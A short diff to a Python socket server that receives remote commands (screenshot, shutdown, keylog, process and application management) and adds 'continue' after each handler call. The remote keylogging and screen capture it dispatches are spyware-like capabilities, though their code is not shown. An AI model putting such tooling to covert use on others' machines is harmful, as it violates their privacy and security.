@@ -74,15 +74,20 @@ class Server:
                 option = conn.recv(1024).decode("utf8")  # Receive client's command
                 print("Client option: " + option)  # Print the received command
                 if option == "TAKEPIC":
-                    self.screenshot(conn)  # Call method to take a screenshot
+                    self.screenshot(conn)
+                    continue# Call method to take a screenshot
                 elif option == "SHUTDOWN":
-                    self.shutdown()  # Call method to shut down the server
+                    self.shutdown()
+                    continue# Call method to shut down the server
                 elif option == "KEYLOG":
-                    self.keylog(conn)  # Call method to handle keylogging
+                    self.keylog(conn)
+                    continue# Call method to handle keylogging
                 elif option == "PROCESS":
-                    self.process(conn)  # Call method to handle process management
+                    self.process(conn) 
+                    continue# Call method to handle process management
                 elif option == "APPLICATION":
-                    self.application(conn)  # Call method to handle application management
+                    self.application(conn) 
+                    continue# Call method to handle application management
                 elif option == "QUIT":
                     self.stop()  # Call method to stop the server
                     break
